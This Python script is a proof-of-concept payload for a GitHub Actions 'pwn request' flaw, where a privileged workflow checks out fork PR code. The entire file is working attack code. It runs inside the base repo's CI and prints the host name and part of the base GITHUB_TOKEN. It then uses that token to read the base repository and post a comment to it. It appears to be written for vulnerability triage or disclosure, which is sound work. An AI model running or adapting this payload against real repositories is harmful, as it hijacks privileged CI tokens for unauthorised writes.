#!/usr/bin/env python3
"""CI slash-command handler (ATTACKER-CONTROLLED via fork PR checkout).

This file is the sink the privileged `issue_comment` workflow runs after a
trusted collaborator issues a slash command. Because the workflow checks out
the fork's mutable PR head (refs/pull/N/head) rather than a reviewed, pinned
SHA, whatever sits at the branch tip at checkout time executes with the BASE
repository's GITHUB_TOKEN (pull-requests:write, actions:write, issues:write).

Proof-of-concept payload: emit a canary, show the base token identity, and use
that token to write to the BASE repo (a capability a fork's own token lacks).
No third-party exfiltration; all effects stay inside the in-scope test repo.
"""
import json
import os
import urllib.request

CANARY = "DEPI-POC-20261002-sglang-3541463c"


def api(method, path, token, data=None):
    url = f"https://api.github.com{path}"
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method, headers={
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "User-Agent": "depi-triage-poc",
    })
    resp = urllib.request.urlopen(req)
    return resp.status, resp.headers, resp.read()


def main() -> None:
    token = os.environ.get("GITHUB_TOKEN", "")
    repo = os.environ.get("REPO_FULL_NAME", "")
    pr = os.environ.get("PR_NUMBER", "")

    print(f"::notice::{CANARY} attacker code executing in privileged context repo={repo} pr={pr}")
    print(f"{CANARY} host={os.uname().nodename} token_prefix={token[:10]} token_len={len(token)}")

    # 1) Confirm this is the BASE repo's token by reading token-scoped metadata.
    try:
        status, headers, raw = api("GET", f"/repos/{repo}", token)
        meta = json.loads(raw)
        print(f"{CANARY} base-repo read ok http={status} full_name={meta.get('full_name')} "
              f"perms={meta.get('permissions')}")
    except Exception as e:
        print(f"{CANARY} base-repo read failed: {e}")

    # 2) Use the BASE token to WRITE to the base repo (post a PR comment).
    #    A fork PR's own GITHUB_TOKEN is read-only; succeeding here proves we hold
    #    the base repo's write-scoped token via the pwn-request/TOCTOU checkout.
    try:
        status, headers, raw = api(
            "POST", f"/repos/{repo}/issues/{pr}/comments", token,
            {"body": f"{CANARY}\n\nAttacker-controlled fork code executed in the privileged "
                     f"`issue_comment` workflow of `{repo}` and used the **base** `GITHUB_TOKEN` "
                     f"(pull-requests/actions/issues: write) to post this comment. "
                     f"Root cause: checkout of the mutable fork head `refs/pull/{pr}/head` after an "
                     f"identity-only gate (TOCTOU). depi-triage PoC."})
        print(f"{CANARY} base-repo WRITE ok http={status} (posted PR comment with base token)")
    except Exception as e:
        print(f"{CANARY} base-repo write failed: {e}")


if __name__ == "__main__":
    main()
